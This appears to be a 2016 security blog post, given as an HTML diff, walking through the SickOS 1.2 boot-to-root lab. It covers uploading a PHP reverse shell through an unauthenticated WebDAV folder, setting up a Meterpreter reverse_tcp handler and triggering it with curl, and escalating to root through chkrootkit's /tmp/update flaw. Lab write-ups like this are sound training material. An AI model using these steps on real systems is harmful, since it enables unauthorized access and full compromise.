@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="[audible]blink ">
+<meta name="description" content="Executive Summary This machine had an unprotected folder which allowed uploading of malicious PHP code which could then be executed remotely. An attacker could then create an unprivileged shell on the victim machine and begin to explore the system for additional vulnerabilities which could lead to a full compromise. During the exploration, an outdated version of chkrootkit was found. By exploiting a known vulnerability in the way chkrootkit parses arguments, an attacker could create a malicious file that would later be run by chkrootkit as a fully privileged user." />
+<meta name="keywords" content="hacking, blog, science, infosec, development, programming" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://sec.alexflor.es/posts/2016/12/b2r-sickosv1.2/" />
+
+
+    <title>
+        
+            B2R: SickOSv1.2 :: [audible]blink&#39;s &#34; r e s e a r c h &#34; 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+
+
+
+
+<meta itemprop="name" content="B2R: SickOSv1.2">
+<meta itemprop="description" content="Executive Summary This machine had an unprotected folder which allowed uploading of malicious PHP code which could then be executed remotely. An attacker could then create an unprivileged shell on the victim machine and begin to explore the system for additional vulnerabilities which could lead to a full compromise. During the exploration, an outdated version of chkrootkit was found. By exploiting a known vulnerability in the way chkrootkit parses arguments, an attacker could create a malicious file that would later be run by chkrootkit as a fully privileged user.">
+<meta itemprop="datePublished" content="2016-12-20T23:45:50-05:00" />
+<meta itemprop="dateModified" content="2016-12-20T23:45:50-05:00" />
+<meta itemprop="wordCount" content="356">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="B2R: SickOSv1.2"/>
+<meta name="twitter:description" content="Executive Summary This machine had an unprotected folder which allowed uploading of malicious PHP code which could then be executed remotely. An attacker could then create an unprivileged shell on the victim machine and begin to explore the system for additional vulnerabilities which could lead to a full compromise. During the exploration, an outdated version of chkrootkit was found. By exploiting a known vulnerability in the way chkrootkit parses arguments, an attacker could create a malicious file that would later be run by chkrootkit as a fully privileged user."/>
+
+
+
+
+
+    <meta property="article:published_time" content="2016-12-20 23:45:50 -0500 EST" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd ~/</span>
+            <span class="logo__cursor" style=""></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://sec.alexflor.es/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>2 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://sec.alexflor.es/posts/2016/12/b2r-sickosv1.2/">B2R: SickOSv1.2</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <h2 id="executive-summary">Executive Summary</h2>
+<p>This machine had an unprotected folder which allowed uploading of malicious PHP code which could then be
+executed remotely. An attacker could then create an unprivileged shell on the victim machine and begin to
+explore the system for additional vulnerabilities which could lead to a full compromise. During the
+exploration, an outdated version of <code>chkrootkit</code> was found. By exploiting a known vulnerability in the way
+<code>chkrootkit</code> parses arguments, an attacker could create a malicious file that would later be run by
+<code>chkrootkit</code> as a fully privileged user.</p>
+<h2 id="tools-used">Tools used</h2>
+<ul>
+<li>nmap - discovery</li>
+<li>uniscan - web application scanner</li>
+<li>metasploit - exploit framework</li>
+<li>msfvenom - payload generation</li>
+<li>local-linux-enum script - enumeration</li>
+</ul>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>In order to cut down on typing, once the IP of the victim computer is discovered, it can be added to the
+<code>/etc/hosts</code>.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">echo &quot;192.168.1.188 vm&quot; &gt;&gt; /etc/hosts
+</code></pre><p>We begin with scanning the victim's machine and find ports 80 and 22.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ nmap -p - -A vm | tee nmap.scan
+</code></pre><p><img src="https://i.imgur.com/jQr872J.png" alt=""></p>
+<p>Navigating to the page and checking its source code reveals nothing</p>
+<p><img src="https://i.imgur.com/1Oigcfa.png" alt=""></p>
+<p>Running <code>uniscan</code>, a folder named <code>test</code> is discovered</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ uniscan -qweds -u http://vm/ 
+</code></pre><p><img src="https://i.imgur.com/wU5Wp2v.png" alt=""></p>
+<p>The listing appeared to be empty but further examination of the <code>/test</code> path revealed that it responded to
+more than just HTTP methods. <code>COPY</code> and <code>MOVE</code> seemed to indicate WebDAV.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ curl -vX OPTIONS vm/test
+</code></pre><p><img src="https://i.imgur.com/6GKZJbc.png" alt=""></p>
+<p>This path requires no authentication and thus allows attackers to upload files to the web server.</p>
+<p><img src="https://i.imgur.com/gSzuoHZ.png" alt=""></p>
+<p>Verifying successful upload:</p>
+<p><img src="https://i.imgur.com/CpTqKyO.png" alt=""></p>
+<p>Having uploaded the reverse shell, the Meterpreter handler is constructed</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 80
+run -j
+</code></pre><p>&hellip;and the payload is activated.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">curl http://vm/test/sshhh.php
+</code></pre><p><img src="https://i.imgur.com/XQ3a9Q4.png" alt=""></p>
+<p>Once a shell has been established on the system, an enumeration script reveals what additional
+vulnerabilities might lead to a full compromise.</p>
+<p>The installed version of <code>chkrootkit</code> is outdated and vulnerable to a code execution exploit.</p>
+<p><img src="https://i.imgur.com/EJSijYp.png" alt=""></p>
+<p>The ExploitDB gives the following description:</p>
+<p><img src="https://i.imgur.com/uVIlbic.png" alt=""></p>
+<p>Using Metasploit, we create another handler and payload, using the <code>chkrootkit</code> module. This module will
+create/overwrite the <code>/tmp/update</code> file with the reverse tcp shell of your choosing. The next time
+<code>chkrootkit</code> is run, this update file will connect back to the attacker computer designated in the payload.</p>
+<p><img src="https://i.imgur.com/9GKQfrW.png" alt=""></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>356 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2016-12-20 23:45 -0500</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="https://sec.alexflor.es/posts/2016/12/b2r-stapler/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">B2R: Stapler</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://sec.alexflor.es/posts/2016/11/b2r-imf-walkthrough/">
+                                <span class="button__text">B2R: IMF Walkthrough</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2019</span>
+            
+                <span><a href="https://sec.alexflor.es">[audible]blink</a></span>
+            
+            <span></span>
+            <span> <a href="https://sec.alexflor.es/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-12497311-8', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+
+    </body>
+</html>
